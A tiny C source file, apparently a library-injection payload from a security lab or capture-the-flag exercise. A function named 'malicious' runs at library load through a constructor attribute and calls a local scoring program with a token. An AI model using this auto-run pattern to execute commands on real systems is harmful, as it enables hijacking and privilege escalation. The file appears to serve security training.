#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score f311c0a3-1ea6-42ab-b085-5b10fea2afd7");
}
